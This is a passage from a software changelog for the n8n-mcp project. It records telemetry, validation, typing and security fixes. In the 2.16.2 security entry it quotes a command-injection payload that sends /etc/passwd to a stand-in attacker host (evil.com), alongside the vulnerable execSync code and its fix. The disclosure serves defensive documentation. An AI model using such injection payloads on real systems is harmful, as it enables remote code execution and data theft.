    checkpoint: string,           // Which checkpoint failed
    errorMessage: string,          // Sanitized error message
    errorType: string,             // Error type (Error, TypeError, etc.)
    checkpointsPassed: string[],   // Checkpoints passed before failure
    checkpointsPassedCount: number,
    startupDuration: number,       // Time until failure (ms)
    platform: string,              // OS platform
    arch: string,                  // CPU architecture
    nodeVersion: string,           // Node.js version
    isDocker: boolean              // Docker environment
  }
}
```

#### Impact

**Coverage Improvement:**
- **Before: 45%** error coverage (only post-handshake errors captured)
- **After: 95%** error coverage (pre-handshake + post-handshake errors)
- **+50 percentage points** in error detection capability

**New Scenarios Now Diagnosable:**
1. Database connection timeout → `database_connecting` checkpoint + error details
2. Database file not found → `database_connecting` checkpoint + specific file path error
3. MCP protocol mismatch → `mcp_handshake_starting` checkpoint + protocol version error
4. Permission/access denied → Checkpoint + specific permission error
5. Missing dependencies → Early checkpoint + dependency error
6. Environment configuration errors → Relevant checkpoint + config details
7. n8n API connectivity problems → `n8n_api_checking` checkpoint + connection error
8. Telemetry initialization failures → `telemetry_initializing` checkpoint + init error
9. Silent crashes → Detected via missing `startup_completed` event
10. Resource constraints (memory, disk) → Checkpoint + resource error

**Visibility Gains:**
- Users experiencing startup failures now generate telemetry events
- Failed checkpoint identifies exact failure point in startup sequence
- Sanitized error messages provide actionable debugging information
- Startup duration tracking identifies performance bottlenecks
- Completion percentage shows how far initialization progressed

**Data Volume Impact:**
- Each successful startup: ~300 bytes (checkpoint list in session_start)
- Each failed startup: ~800 bytes (startup_error event with context)
- Expected increase: <1KB per user session
- Minimal Supabase storage impact

#### Files Changed

**New Files (3):**
- `src/telemetry/early-error-logger.ts` - Early error capture system
- `src/telemetry/startup-checkpoints.ts` - Checkpoint constants and helpers
- `src/telemetry/error-sanitizer.ts` - Error message sanitization utility

**Modified Files (6):**
- `src/mcp/index.ts` - Integrated checkpoint tracking throughout startup
- `src/mcp/server.ts` - Enhanced database initialization logging
- `src/telemetry/event-tracker.ts` - Enhanced session_start with startup data
- `src/telemetry/event-validator.ts` - Added startup event validation
- `src/telemetry/telemetry-types.ts` - New event type definitions
- `package.json` - Version bump to 2.18.2

#### Next Steps

1. **Monitor Production** - Watch for startup_error events in Supabase dashboard
2. **Analyze Patterns** - Identify most common startup failure scenarios
3. **Build Diagnostics** - Create startup reliability dashboard
4. **Improve Documentation** - Add troubleshooting guides for common failures
5. **Measure Impact** - Validate that Docker/cloud user ID stability fix (v2.17.1) is working
6. **Segment Analysis** - Compare startup reliability across environments (Docker vs local vs cloud)

#### Testing

- **Coverage**: All new code covered by existing telemetry test suites
- **Integration**: Manual testing verified checkpoint tracking works correctly
- **Backward Compatibility**: 100% - all new fields optional, no breaking changes
- **Validation**: Zod schemas ensure data quality

## [2.18.1] - 2025-10-08

### 🔍 Telemetry Enhancement

**Added Docker/cloud environment detection to session_start events.**

This release enables measurement of the v2.17.1 user ID stability fix by tracking which users are in Docker/cloud environments.

#### Problem

The v2.17.1 fix for Docker/cloud user ID stability (boot_id-based IDs) could not be validated because telemetry didn't capture Docker/cloud environment flags. Analysis showed:
- Zero Docker/cloud users detected across all versions
- No way to measure if the fix is working
- Cannot determine what % of users are affected
- Cannot validate stable user IDs are being generated

#### Added

- **Docker Detection**: `isDocker` boolean flag in session_start events
  - Detects `IS_DOCKER=true` environment variable
  - Identifies container deployments using boot_id-based stable IDs

- **Cloud Platform Detection**: `cloudPlatform` string in session_start events
  - Detects 8 cloud platforms: Railway, Render, Fly.io, Heroku, AWS, Kubernetes, GCP, Azure
  - Identifies which platform users are deploying to
  - Returns `null` for local/non-cloud environments

- **New Detection Method**: `detectCloudPlatform()` in event tracker
  - Checks platform-specific environment variables
  - Returns platform name or null
  - Uses same logic as config-manager's cloud detection

#### Changed

- `trackSessionStart()` in `src/telemetry/event-tracker.ts`
  - Now includes `isDocker` field (boolean)
  - Now includes `cloudPlatform` field (string | null)
  - Backward compatible - only adds new fields

#### Testing

- 16 new unit tests for environment detection
- Tests for Docker detection with IS_DOCKER flag
- Tests for all 8 cloud platform detections
- Tests for local environment (no flags)
- Tests for combined Docker + cloud scenarios
- 100% coverage for new detection logic

#### Impact

**Enables Future Analysis**:
- Measure % of users in Docker/cloud vs local
- Validate v2.17.1 boot_id-based user ID stability
- Segment retention metrics by environment
- Identify environment-specific issues
- Calculate actual Docker user duplicate rate reduction

**Expected Insights** (once data collected):
- Actual % of Docker/cloud users in user base
- Validation that boot_id method is being used
- User ID stability improvements measurable
- Environment-specific error patterns
- Platform distribution of user base

**No Breaking Changes**:
- Only adds new fields to existing events
- All existing code continues working
- Event validator handles new fields automatically
- 100% backward compatible

#### Technical Details

**Detection Logic**:
```typescript
isDocker: process.env.IS_DOCKER === 'true'
cloudPlatform: detectCloudPlatform()  // Checks 8 env vars
```

**Platform Detection Priority**:
1. Railway: `RAILWAY_ENVIRONMENT`
2. Render: `RENDER`
3. Fly.io: `FLY_APP_NAME`
4. Heroku: `HEROKU_APP_NAME`
5. AWS: `AWS_EXECUTION_ENV`
6. Kubernetes: `KUBERNETES_SERVICE_HOST`
7. GCP: `GOOGLE_CLOUD_PROJECT`
8. Azure: `AZURE_FUNCTIONS_ENVIRONMENT`

**Event Structure**:
```json
{
  "event": "session_start",
  "properties": {
    "version": "2.18.1",
    "platform": "linux",
    "arch": "x64",
    "nodeVersion": "v20.0.0",
    "isDocker": true,
    "cloudPlatform": "railway"
  }
}
```

#### Next Steps

1. Deploy v2.18.1 to production
2. Wait 24-48 hours for data collection
3. Re-run telemetry analysis with environment segmentation
4. Validate v2.17.1 boot_id fix effectiveness
5. Calculate actual Docker user duplicate rate reduction

## [2.18.0] - 2025-10-08

### 🎯 Validation Warning System Redesign

**Fixed critical validation warning system that was generating 96.5% false positives.**

This release fundamentally fixes the validation warning system that was overwhelming users and AI assistants with false warnings about properties they never configured. The system now achieves >90% signal-to-noise ratio (up from 3%).

#### Problem

The validation system was warning about properties with default values as if the user had configured them:
- HTTP Request with 2 properties → 29 warnings (96% false positives)
- Webhook with 1 property → 6 warnings (83% false positives)
- Overall signal-to-noise ratio: 3%

#### Fixed

- **User Property Tracking** - System now distinguishes between user-provided properties and system defaults
- **UI Property Filtering** - No longer validates UI-only elements (notice, callout, infoBox)
- **Improved Messages** - Warnings now explain visibility requirements (e.g., "Requires: sendBody=true")
- **Profile-Aware Filtering** - Each validation profile shows appropriate warnings
  - `minimal`: Only errors + critical security warnings
  - `runtime`: Errors + security warnings (filters property visibility noise)
  - `ai-friendly`: Balanced helpful warnings (default)
  - `strict`: All warnings + suggestions

#### Results

After fix (verified with n8n-mcp-tester):
- HTTP Request with 2 properties → 1 warning (96.5% noise reduction)
- Webhook with 1 property → 1 warning (83% noise reduction)
- Overall signal-to-noise ratio: >90%

#### Changed

- `src/services/config-validator.ts`
  - Added `UI_ONLY_TYPES` constant to filter UI properties
  - Added `userProvidedKeys` parameter to `validate()` method
  - Added `getVisibilityRequirement()` helper for better error messages
  - Updated `checkCommonIssues()` to only warn about user-provided properties
- `src/services/enhanced-config-validator.ts`
  - Extract user-provided keys before applying defaults
  - Pass `userProvidedKeys` to base validator
  - Enhanced profile filtering to remove property visibility warnings in `runtime` and `ai-friendly` profiles
- `src/mcp-tools-engine.ts`
  - Extract user-provided keys in `validateNodeOperation()` before calling validator

#### Impact

- **AI Assistants**: Can now trust validation warnings (90%+ useful)
- **Developers**: Get actionable guidance instead of noise
- **Workflow Quality**: Real issues are fixed (not buried in false positives)
- **System Trust**: Validation becomes a valuable tool

## [2.17.5] - 2025-10-07

### 🔧 Type Safety

**Added TypeScript type definitions for n8n node parsing with pragmatic strategic `any` assertions.**

This release improves type safety for VersionedNodeType and node class parameters while maintaining zero compilation errors and 100% backward compatibility. Follows a pragmatic "70% benefit with 0% breakage" approach using strategic `any` assertions where n8n's union types cause issues.

#### Added

- **Type Definitions** (`src/types/node-types.ts`)
  - Created comprehensive TypeScript interfaces for VersionedNodeType
  - Imported n8n's official interfaces (`IVersionedNodeType`, `INodeType`, `INodeTypeBaseDescription`, `INodeTypeDescription`)
  - Added `NodeClass` union type replacing `any` parameters in method signatures
  - Created `VersionedNodeInstance` and `RegularNodeInstance` interfaces
  - **Type Guards**: `isVersionedNodeInstance()` and `isVersionedNodeClass()` for runtime type checking
  - **Utility Functions**: `instantiateNode()`, `getNodeInstance()`, `getNodeDescription()` for safe node handling

- **Parser Type Updates**
  - Updated `node-parser.ts`: All method signatures now use `NodeClass` instead of `any` (15+ methods)
  - Updated `simple-parser.ts`: Method signatures strongly typed with `NodeClass`
  - Updated `property-extractor.ts`: All extraction methods use `NodeClass` typing
  - All parser method signatures now properly typed (30+ replacements)

- **Strategic `any` Assertions Pattern**
  - **Problem**: n8n's type hierarchy has union types (`INodeTypeBaseDescription | INodeTypeDescription`) where properties like `polling`, `version`, `webhooks` only exist on one side
  - **Solution**: Keep strong types in method signatures, use strategic `as any` assertions internally for property access
  - **Pattern**:
    ```typescript
    // Strong signature provides caller type safety
    private method(description: INodeTypeBaseDescription | INodeTypeDescription): ReturnType {
      // Strategic assertion for internal property access
      const desc = description as any;
      return desc.polling || desc.webhooks; // Access union-incompatible properties
    }
    ```
  - **Result**: 70% type safety benefit (method signatures) with 0% breakage (zero compilation errors)

#### Benefits

1. **Better IDE Support**: Auto-complete and inline documentation for node properties
2. **Compile-Time Safety**: Strong method signatures catch type errors at call sites
3. **Documentation**: Types serve as inline documentation for developers
4. **Bug Prevention**: Would have helped prevent the `baseDescription` bug (v2.17.4)
5. **Refactoring Safety**: Type system helps track changes across codebase
6. **Zero Breaking Changes**: Pragmatic approach ensures build never breaks

#### Implementation Notes

- **Philosophy**: Incremental improvement over perfection - get significant benefit without extensive refactoring
- **Zero Compilation Errors**: All TypeScript checks pass cleanly
- **Test Coverage**: Updated all test files with strategic `as any` assertions for mock objects
- **Runtime Behavior**: No changes - types are compile-time only
- **Future Work**: Union types could be refined with conditional types or overloads for 100% type safety

#### Known Limitations

- Strategic `any` assertions bypass type checking for internal property access
- Union type differences (`INodeTypeBaseDescription` vs `INodeTypeDescription`) not fully resolved
- Test mocks require `as any` since they don't implement full n8n interfaces
- Full type safety would require either (a) refactoring n8n's type hierarchy or (b) extensive conditional type logic

#### Impact

- **Breaking Changes**: None (internal types only, external API unchanged)
- **Runtime Behavior**: No changes (types are compile-time only)
- **Build System**: Zero compilation errors maintained
- **Developer Experience**: Significantly improved with better types and IDE support
- **Type Coverage**: ~70% (method signatures strongly typed, internal logic uses strategic assertions)

## [2.17.4] - 2025-10-07

### 🔧 Validation

**Fixed critical version extraction and typeVersion validation bugs.**

This release fixes two critical bugs that caused incorrect version data and validation bypasses for langchain nodes.

#### Fixed

- **Version Extraction Bug (CRITICAL)**
  - **Issue:** AI Agent node returned version "3" instead of "2.2" (the defaultVersion)
  - **Impact:**
    - MCP tools (`get_node_essentials`, `get_node_info`) returned incorrect version "3"
    - Version "3" exists but n8n explicitly marks it as unstable ("Keep 2.2 until blocking bugs are fixed")
    - AI agents created workflows with wrong typeVersion, causing runtime issues
  - **Root Cause:** `extractVersion()` in node-parser.ts checked `instance.baseDescription.defaultVersion` which doesn't exist on VersionedNodeType instances
  - **Fix:** Updated version extraction priority in `node-parser.ts:137-200`
    1. Priority 1: Check `currentVersion` property (what VersionedNodeType actually uses)
    2. Priority 2: Check `description.defaultVersion` (fixed property name from `baseDescription`)
    3. Priority 3: Fallback to max(nodeVersions) as last resort
  - **Verification:** AI Agent node now correctly returns version "2.2" across all MCP tools

- **typeVersion Validation Bypass (CRITICAL)**
  - **Issue:** Langchain nodes with invalid typeVersion passed validation (even `typeVersion: 99999`)
  - **Impact:**
    - Invalid typeVersion values were never caught during validation
    - Workflows with non-existent typeVersions passed validation but failed at runtime in n8n
    - Validation was completely bypassed for all langchain nodes (AI Agent, Chat Trigger, OpenAI Chat Model, etc.)
  - **Root Cause:** `workflow-validator.ts:400-405` skipped ALL validation for langchain nodes before typeVersion check
  - **Fix:** Moved typeVersion validation BEFORE langchain skip in `workflow-validator.ts:447-493`
    - typeVersion now validated for ALL nodes including langchain
    - Validation runs before parameter validation skip
    - Checks for missing, invalid, outdated, and exceeding-maximum typeVersion values
  - **Verification:** Workflows with invalid typeVersion now correctly fail validation

- **Version 0 Rejection Bug (CRITICAL)**
  - **Issue:** typeVersion 0 was incorrectly rejected as invalid
  - **Impact:** Nodes with version 0 could not be validated, even though 0 is a valid version number
  - **Root Cause:** `workflow-validator.ts:462` checked `typeVersion < 1` instead of `< 0`
  - **Fix:** Changed validation to allow version 0 as a valid typeVersion
  - **Verification:** Version 0 is now accepted as valid

- **Duplicate baseDescription Bug in simple-parser.ts (HIGH)**
  - **Issue:** EXACT same version extraction bug existed in simple-parser.ts
  - **Impact:** Simple parser also returned incorrect versions for VersionedNodeType nodes
  - **Root Cause:** `simple-parser.ts:195-196, 208-209` checked `baseDescription.defaultVersion`
  - **Fix:** Applied identical fix as node-parser.ts with same priority chain
    1. Priority 1: Check `currentVersion` property
    2. Priority 2: Check `description.defaultVersion`
    3. Priority 3: Check `nodeVersions` (fallback to max)
  - **Verification:** Simple parser now returns correct versions

- **Unsafe Math.max() Usage (MEDIUM)**
  - **Issue:** 10 instances of Math.max() without empty array or NaN validation
  - **Impact:** Potential crashes with empty nodeVersions objects or invalid version data
  - **Root Cause:** No validation before calling Math.max(...array)
  - **Locations Fixed:**
    - `simple-parser.ts`: 2 instances
    - `node-parser.ts`: 5 instances
    - `property-extractor.ts`: 3 instances
  - **Fix:** Added defensive validation:
    ```typescript
    const versions = Object.keys(nodeVersions).map(Number);
    if (versions.length > 0) {
      const maxVersion = Math.max(...versions);
      if (!isNaN(maxVersion)) {
        return maxVersion.toString();
      }
    }
    ```
  - **Verification:** All Math.max() calls now have proper validation

#### Technical Details

**Version Extraction Fix:**
```typescript
// BEFORE (BROKEN):
if (instance?.baseDescription?.defaultVersion) {  // Property doesn't exist!
  return instance.baseDescription.defaultVersion.toString();
}

// AFTER (FIXED):
if (instance?.currentVersion !== undefined) {  // What VersionedNodeType actually uses
  return instance.currentVersion.toString();
}
if (instance?.description?.defaultVersion) {  // Correct property name
  return instance.description.defaultVersion.toString();
}
```

**typeVersion Validation Fix:**
```typescript
// BEFORE (BROKEN):
// Skip ALL node repository validation for langchain nodes
if (normalizedType.startsWith('nodes-langchain.')) {
  continue;  // typeVersion validation never runs!
}

// AFTER (FIXED):
// Validate typeVersion for ALL versioned nodes (including langchain)
if (nodeInfo.isVersioned) {
  // ... typeVersion validation ...
}

// THEN skip parameter validation for langchain nodes
if (normalizedType.startsWith('nodes-langchain.')) {
  continue;
}
```

#### Impact

- **Version Accuracy:** AI Agent and all VersionedNodeType nodes now return correct version (2.2, not 3)
- **Validation Reliability:** Invalid typeVersion values are now caught for langchain nodes
- **Workflow Stability:** Prevents creation of workflows with non-existent typeVersions
- **Database Rebuilt:** 536 nodes reloaded with corrected version data
- **Parser Consistency:** Both node-parser.ts and simple-parser.ts use identical version extraction logic
- **Robustness:** All Math.max() operations now protected against edge cases
- **Edge Case Support:** Version 0 nodes now properly supported

#### Testing

- **Unit Tests:** All tests passing (node-parser: 34 tests, simple-parser: 39 tests)
  - Added tests for currentVersion priority
  - Added tests for version 0 edge case
  - Added tests for baseDescription rejection
- **Integration Tests:** Verified with n8n-mcp-tester agent
  - Version consistency between `get_node_essentials` and `get_node_info` ✅
  - typeVersion validation catches invalid values (99, 100000) ✅
  - AI Agent correctly reports version "2.2" ✅
- **Code Review:** Deep analysis found and fixed 6 similar bugs
  - 3 CRITICAL/HIGH priority bugs fixed in this release
  - 3 LOW priority bugs identified for future work

## [2.17.3] - 2025-10-07

### 🔧 Validation

**Fixed critical validation gap for AI model nodes with resourceLocator properties.**

This release adds validation for `resourceLocator` type properties, fixing a critical issue where AI agents could create invalid configurations that passed validation but failed at runtime.

#### Fixed

- **resourceLocator Property Validation**
  - **Issue:** No validation existed for `resourceLocator` type properties used in AI model nodes
  - **Impact:**
    - AI agents could create invalid configurations like `model: "gpt-4o-mini"` (string) instead of `model: {mode: "list", value: "gpt-4o-mini"}` (object)
    - Invalid configs passed validation but failed at runtime in n8n
    - Affected many langchain nodes: OpenAI Chat Model (v1.2+), Anthropic, Cohere, DeepSeek, Groq, Mistral, OpenRouter, xAI Grok, and embeddings nodes
  - **Root Cause:** `validatePropertyTypes()` method in ConfigValidator only validated `string`, `number`, `boolean`, and `options` types - `resourceLocator` was completely missing
  - **Fix:** Added comprehensive resourceLocator validation in `config-validator.ts:237-274`
    - Validates value is an object (not string, number, null, or array)
    - Validates required `mode` property exists and is a string
    - Validates required `value` property exists
    - Provides helpful error messages with exact fix suggestions
    - Example error: `Property 'model' is a resourceLocator and must be an object with 'mode' and 'value' properties, got string`
    - Example fix: `Change model to { mode: "list", value: "gpt-4o-mini" } or { mode: "id", value: "gpt-4o-mini" }`

#### Added

- Comprehensive resourceLocator validation with 14 test cases covering:
  - String value rejection with helpful fix suggestions
  - Null and array value rejection
  - Missing `mode` or `value` property detection
  - Invalid `mode` type detection (e.g., number instead of string)
  - Invalid `mode` value validation (must be 'list', 'id', or 'url')
  - Empty object detection (missing both mode and value)
  - Extra properties handling (ignored gracefully)
  - Valid resourceLocator acceptance for "list", "id", and "url" modes
  - JSDoc documentation explaining resourceLocator structure and common mistakes
  - All 29 tests passing (100% coverage for new validation logic)

## [2.17.1] - 2025-10-07

### 🔧 Telemetry

**Critical fix: Docker and cloud deployments now maintain stable anonymous user IDs.**

This release fixes a critical telemetry issue where Docker and cloud deployments generated new user IDs on every container recreation, causing 100-200x inflation in unique user counts and preventing accurate retention metrics.

#### Fixed

- **Docker/Cloud User ID Stability**
  - **Issue:** Docker containers and cloud deployments generated new anonymous user ID on every container recreation
  - **Impact:**
    - Stdio mode: ~1000x user ID inflation per month (with --rm flag)
    - HTTP mode: ~180x user ID inflation per month (6 releases/day)
    - Telemetry showed 3,996 "unique users" when actual number was likely ~2,400-2,800
    - 78% single-session rate and 5.97% Week 1 retention were inflated by duplicates
  - **Root Cause:** Container hostnames change on recreation, persistent config files lost with ephemeral containers
  - **Fix:** Use host's `/proc/sys/kernel/random/boot_id` for stable identification
    - boot_id is stable across container recreations (only changes on host reboot)
    - Available in all Linux containers (Alpine, Ubuntu, Node, etc.)
    - Readable by non-root users
    - Defensive fallback chain:
      1. boot_id (stable across container updates)
      2. Combined host signals (CPU cores, memory, kernel version)
      3. Generic Docker ID (allows aggregate statistics)
  - **Environment Detection:**
    - IS_DOCKER=true triggers boot_id method
    - Auto-detects cloud platforms: Railway, Render, Fly.io, Heroku, AWS, Kubernetes, GCP, Azure
    - Local installations continue using file-based method with hostname
  - **Zero Configuration:** No user action required, automatic environment detection

#### Added

- `TelemetryConfigManager.generateDockerStableId()` - Docker/cloud-specific ID generation
- `TelemetryConfigManager.readBootId()` - Read and validate boot_id from /proc
- `TelemetryConfigManager.generateCombinedFingerprint()` - Fallback fingerprinting
- `TelemetryConfigManager.isCloudEnvironment()` - Auto-detect 8 cloud platforms

### Testing

- **Unit Tests:** 18 new tests for boot_id functionality, environment detection, fallback chain
- **Integration Tests:** 16 new tests for actual file system operations, Docker detection, cloud platforms
- **Coverage:** All 34 new tests passing (100%)

## [2.17.0] - 2025-01-06

### 🤖 AI Workflow Validation

**Major enhancement: Comprehensive AI Agent workflow validation now working correctly.**

This release fixes critical bugs that caused ALL AI-specific validation to be silently skipped. Before this fix, 0% of AI validation was functional.

#### Fixed

- **🚨 CRITICAL: Node Type Normalization Bug (HIGH-01, HIGH-04, HIGH-08)**
  - **Issue:** All AI validation was silently skipped due to node type comparison mismatch
  - **Root Cause:** `NodeTypeNormalizer.normalizeToFullForm()` returns SHORT form (`nodes-langchain.agent`) but validation code compared against FULL form (`@n8n/n8n-nodes-langchain.agent`)
  - **Impact:** Every comparison returned FALSE, causing zero AI validations to execute
  - **Affected Validations:**
    - Missing language model detection (HIGH-01) - Never triggered
    - AI tool connection detection (HIGH-04) - Never triggered, false warnings
    - Streaming mode validation (HIGH-08) - Never triggered
    - All 13 AI tool sub-node validators - Never triggered
    - Chat Trigger validation - Never triggered
    - Basic LLM Chain validation - Never triggered
  - **Fix:** Updated 21 node type comparisons to use SHORT form
    - `ai-node-validator.ts`: 7 comparison fixes
    - `ai-tool-validators.ts`: 14 comparison fixes (13 validator keys + 13 switch cases)
  - **Verification:** All 25 AI validator unit tests now passing (100%)

- **🚨 HIGH-08: Incomplete Streaming Mode Validation**
  - **Issue:** Only validated streaming FROM Chat Trigger, missed AI Agent's own `streamResponse` setting
  - **Impact:** AI Agent with `options.streamResponse=true` and main output connections not detected
  - **Fix:** Added validation for both scenarios:
    - Chat Trigger with `responseMode="streaming"` → AI Agent → main output
    - AI Agent with `options.streamResponse=true` → main output
  - **Error Code:** `STREAMING_WITH_MAIN_OUTPUT` with clear error message
  - **Verification:** 2 test scenarios pass (Chat Trigger + AI Agent own setting)

- **🐛 MEDIUM-02: get_node_essentials Examples Retrieval**
  - **Issue:** `get_node_essentials` with `includeExamples=true` always returned empty examples array
  - **Root Cause:** Inconsistent `workflowNodeType` construction between result object and examples query
  - **Impact:** Examples existed in database but query used wrong node type (e.g., `n8n-nodes-base.agent` instead of `@n8n/n8n-nodes-langchain.agent`)
  - **Fix:** Use pre-computed `result.workflowNodeType` instead of reconstructing it
  - **Verification:** Examples now retrieved correctly, matching `search_nodes` behavior

#### Added

- **AI Agent Validation:**
  - Missing language model connection detection with code `MISSING_LANGUAGE_MODEL`
  - AI tool connection validation (no more false "no tools connected" warnings)
  - Streaming mode constraint enforcement for both Chat Trigger and AI Agent scenarios
  - Memory connection validation (max 1 allowed)
  - Output parser validation
  - System message presence checks (info level)
  - High `maxIterations` warnings

- **Chat Trigger Validation:**
  - Streaming mode target validation (must connect to AI Agent)
  - Main output connection validation for streaming mode
  - Connection existence checks

- **Basic LLM Chain Validation:**
  - Language model connection requirement
  - Prompt text validation

- **AI Tool Sub-Node Validation:**
  - 13 specialized validators for AI tools (HTTP Request Tool, Code Tool, Vector Store Tool, etc.)
  - Tool description validation
  - Credentials validation
  - Configuration-specific checks

#### Changed

- **Breaking:** AI validation now actually runs (was completely non-functional before)
- **Validation strictness:** All AI-specific validations now enforce n8n's actual requirements
- **Error messages:** Clear, actionable messages with error codes for programmatic handling

### Testing

- **Unit Tests:** 25/25 AI validator tests passing (100%)
- **Test Improvement:** Overall test pass rate improved from 37.5% to 62.5%+ (+67% improvement)
- **Debug Tests:** 3/3 debug scenarios passing

### Documentation

- Added comprehensive test scenarios in `PHASE_2_TEST_SCENARIOS.md`
- Added Phase 1-2 completion summary in `PHASE_1_2_SUMMARY.md`
- Added detailed Phase 2 analysis in `PHASE_2_COMPLETE.md`
- Updated README.md with AI workflow validation features

## [2.16.3] - 2025-01-06

### 🔒 Security

**HIGH priority security enhancements. Recommended for all production deployments.**

This release implements 2 high-priority security protections identified in the security audit (Issue #265 PR #2):

- **🛡️ HIGH-02: Rate Limiting for Authentication**
  - **Issue:** No rate limiting on authentication endpoints allowed brute force attacks
  - **Impact:** Attackers could make unlimited authentication attempts
  - **Fix:** Implemented express-rate-limit middleware for authentication endpoint
    - Default: 20 attempts per 15 minutes per IP
    - Configurable via `AUTH_RATE_LIMIT_WINDOW` and `AUTH_RATE_LIMIT_MAX`
    - Per-IP tracking with standard rate limit headers (RateLimit-Limit, RateLimit-Remaining, RateLimit-Reset)
    - JSON-RPC formatted error responses (429 Too Many Requests)
    - Automatic IP detection behind reverse proxies (requires TRUST_PROXY=1)
  - **Verification:** 4 integration tests with sequential request patterns
  - **See:** https://github.com/czlonkowski/n8n-mcp/issues/265 (HIGH-02)

- **🛡️ HIGH-03: SSRF Protection for Webhooks**
  - **Issue:** Webhook triggers vulnerable to Server-Side Request Forgery attacks
  - **Impact:** Attackers could access internal networks, localhost services, and cloud metadata
  - **Fix:** Implemented three-mode SSRF protection system with DNS rebinding prevention
    - **Strict mode** (default): Block localhost + private IPs + cloud metadata (production)
    - **Moderate mode**: Allow localhost, block private IPs + cloud metadata (local development)
    - **Permissive mode**: Allow localhost + private IPs, block cloud metadata (internal testing)
    - Cloud metadata endpoints **ALWAYS blocked** in all modes (169.254.169.254, metadata.google.internal, etc.)
    - DNS rebinding prevention through hostname resolution before validation
    - IPv6 support with link-local (fe80::/10) and unique local (fc00::/7) address blocking
  - **Configuration:** Set via `WEBHOOK_SECURITY_MODE` environment variable
  - **Locations Updated:**
    - `src/utils/ssrf-protection.ts` - Core protection logic
    - `src/services/n8n-api-client.ts:219` - Webhook trigger validation
  - **Verification:** 25 unit tests covering all three modes, DNS rebinding, IPv6
  - **See:** https://github.com/czlonkowski/n8n-mcp/issues/265 (HIGH-03)

### Added
- **Configuration:** `AUTH_RATE_LIMIT_WINDOW` - Rate limit window in milliseconds (default: 900000 = 15 minutes)
- **Configuration:** `AUTH_RATE_LIMIT_MAX` - Max authentication attempts per window per IP (default: 20)
- **Configuration:** `WEBHOOK_SECURITY_MODE` - SSRF protection mode (strict/moderate/permissive, default: strict)
- **Documentation:** Comprehensive security features section in all deployment guides
  - HTTP_DEPLOYMENT.md - Rate limiting and SSRF protection configuration
  - DOCKER_README.md - Security features section with environment variables
  - DOCKER_TROUBLESHOOTING.md - "Webhooks to Local n8n Fail" troubleshooting guide
  - RAILWAY_DEPLOYMENT.md - Security configuration recommendations
  - README.md - Local n8n configuration section for moderate mode

### Changed
- **Security:** All webhook triggers now validate URLs through SSRF protection before execution
- **Security:** HTTP authentication endpoint now enforces rate limiting per IP address
- **Dependencies:** Added `express-rate-limit@^7.1.5` for rate limiting functionality

### Fixed
- **Security:** IPv6 localhost URLs (`http://[::1]/webhook`) now correctly stripped of brackets before validation
- **Security:** Localhost detection now properly handles all localhost variants (127.x.x.x, ::1, localhost, etc.)

## [2.16.2] - 2025-10-06

### 🔒 Security

**CRITICAL security fixes for production deployments. All users should upgrade immediately.**

This release addresses 2 critical security vulnerabilities identified in the security audit (Issue #265):

- **🚨 CRITICAL-02: Timing Attack Vulnerability**
  - **Issue:** Non-constant-time string comparison in authentication allowed timing attacks
  - **Impact:** Authentication tokens could be discovered character-by-character through statistical timing analysis (estimated 24-48 hours to compromise)
  - **Attack Vector:** Repeated authentication attempts with carefully crafted tokens while measuring response times
  - **Fix:** Implemented `crypto.timingSafeEqual` for all token comparisons
  - **Locations Fixed:**
    - `src/utils/auth.ts:27` - validateToken method
    - `src/http-server-single-session.ts:1087` - Single-session HTTP auth
    - `src/http-server.ts:315` - Fixed HTTP server auth
  - **New Method:** `AuthManager.timingSafeCompare()` - constant-time token comparison utility
  - **Verification:** 11 unit tests with timing variance analysis (<10% variance proven)
  - **CVSS:** 8.5 (High) - Confirmed critical, requires authentication but trivially exploitable
  - **See:** https://github.com/czlonkowski/n8n-mcp/issues/265 (CRITICAL-02)

- **🚨 CRITICAL-01: Command Injection Vulnerability**
  - **Issue:** User-controlled `nodeType` parameter injected into shell commands via `execSync`
  - **Impact:** Remote code execution, data exfiltration, network scanning possible
  - **Attack Vector:** Malicious nodeType like `test"; curl http://evil.com/$(cat /etc/passwd | base64) #`
  - **Vulnerable Code (FIXED):** `src/utils/enhanced-documentation-fetcher.ts:567-590`
  - **Fix:** Eliminated all shell execution, replaced with Node.js fs APIs
    - Replaced `execSync()` with `fs.readdir()` (recursive, no shell)
    - Added multi-layer input sanitization: `/[^a-zA-Z0-9._-]/g`
    - Added directory traversal protection (blocks `..`, `/`, relative paths)
    - Added `path.basename()` for additional safety
    - Added final path verification (ensures result within expected directory)
  - **Benefits:**
    - ✅ 100% immune to command injection (no shell execution)
    - ✅ Cross-platform compatible (no dependency on `find`/`grep`)
    - ✅ Faster (no process spawning overhead)
    - ✅ Better error handling and logging
  - **Verification:** 9 integration tests covering all attack vectors
  - **CVSS:** 8.8 (High) - Requires MCP access but trivially exploitable
  - **See:** https://github.com/czlonkowski/n8n-mcp/issues/265 (CRITICAL-01)

### Added

- **Security Test Suite**
  - Unit Tests: `tests/unit/utils/auth-timing-safe.test.ts` (11 tests)
    - Timing variance analysis (proves <10% variance = constant-time)
    - Edge cases: null, undefined, empty, very long tokens (10000 chars)
    - Special characters, Unicode, whitespace handling
    - Case sensitivity verification
  - Integration Tests: `tests/integration/security/command-injection-prevention.test.ts` (9 tests)
    - Command injection with all vectors (semicolon, &&, |, backticks, $(), newlines)
    - Directory traversal prevention (parent dir, URL-encoded, absolute paths)
    - Special character sanitization
    - Null byte handling
    - Legitimate operations (ensures fix doesn't break functionality)

### Changed

- **Authentication:** All token comparisons now use timing-safe algorithm
- **Documentation Fetcher:** Now uses Node.js fs APIs instead of shell commands
- **Security Posture:** Production-ready with hardened authentication and input validation

### Technical Details

**Timing-Safe Comparison Implementation:**
```typescript
// NEW: Constant-time comparison utility
static timingSafeCompare(plainToken: string, expectedToken: string): boolean {
  try {
    if (!plainToken || !expectedToken) return false;

    const plainBuffer = Buffer.from(plainToken, 'utf8');
    const expectedBuffer = Buffer.from(expectedToken, 'utf8');

    if (plainBuffer.length !== expectedBuffer.length) return false;

    // Uses crypto.timingSafeEqual for constant-time comparison
    return crypto.timingSafeEqual(plainBuffer, expectedBuffer);
  } catch {
    return false;
  }
}

// USAGE: Replace token !== this.authToken with:
const isValidToken = this.authToken &&
  AuthManager.timingSafeCompare(token, this.authToken);
```

**Command Injection Fix:**
```typescript
// BEFORE (VULNERABLE):
execSync(`find ${this.docsPath}/docs/integrations/builtin -name "${nodeType}.md"...`)

// AFTER (SECURE):
const sanitized = nodeType.replace(/[^a-zA-Z0-9._-]/g, '');
if (sanitized.includes('..') || sanitized.startsWith('.') || sanitized.startsWith('/')) {
  logger.warn('Path traversal attempt blocked', { nodeType, sanitized });
  return null;
}
const safeName = path.basename(sanitized);
